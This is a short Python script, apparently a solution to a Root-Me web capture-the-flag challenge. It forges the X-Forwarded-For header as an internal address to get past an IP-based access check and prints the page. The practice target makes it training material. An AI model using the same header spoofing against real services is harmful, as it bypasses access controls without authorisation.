# OK
import requests
url = "http://challenge01.root-me.org/web-serveur/ch68/"

head = {"X-Forwarded-For":"10.0.0.0"}

result = requests.get(url,headers=head)

print(result.text)